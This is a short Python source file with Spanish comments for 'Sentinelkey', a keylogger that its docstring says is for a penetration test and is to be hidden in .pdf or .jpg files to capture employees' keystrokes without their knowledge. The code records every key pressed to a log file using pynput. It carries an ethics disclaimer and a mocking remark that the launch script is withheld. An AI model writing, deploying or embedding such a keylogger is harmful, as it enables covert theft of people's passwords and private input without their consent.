""" Sentinelkey es un keylogger diseñádo para una prueba de pentesting 
este keylogger sera implementado  en diferentes tipos de archivos como .pdf o .jpg
este sera con el objetivo de demostrar el descuido de los empleados  y como se puede
extraer la informacion sin que se den cuenta .
ADVERTENCIA : Se usa con la finalidad  etica , cualquier uso  incorrecto escapa de nuestras manos
ademas que  por los permisos especiales no le sera facil de usar jaja  
"""
from pynput.keyboard import Key, Listener  # type: ignore

file = "" #  ruta no especifica  , se recomienda poner una ruta standar

# Función para detectar la tecla presionada
def detecteKey(key):
    key_str = str(key).replace("'", "")  # Convertir la tecla a string
    try:
        with open(file, "a") as f:
            f.write(key_str)  # Escribir la tecla detectada sin salto de línea
    except Exception as e:
        print(f"Error al escribir en el archivo: {e}")  # Imprimir cualquier error al escribir
    print("Tecla detectada: {0}".format(key_str))  # Mostrar la tecla detectada

# Función para salir del programa si se presiona "Esc"
def exit(key):
    if key == Key.esc:  # Usar Key.esc correctamente
        print("Saliendo...")
        return False  # Detener el listener

# Función principal para iniciar el listener
def main():
    with Listener(on_press=detecteKey, on_release=exit) as listener:
        listener.join()

# Ejecutar la función main solo si el script se ejecuta directamente
if __name__ == "__main__":
    main()
""" el scripting para ejecuarlo en el sistema operativo no esta disponible pues este archivo se subira a una plataforma  ya se jodieron jujua"""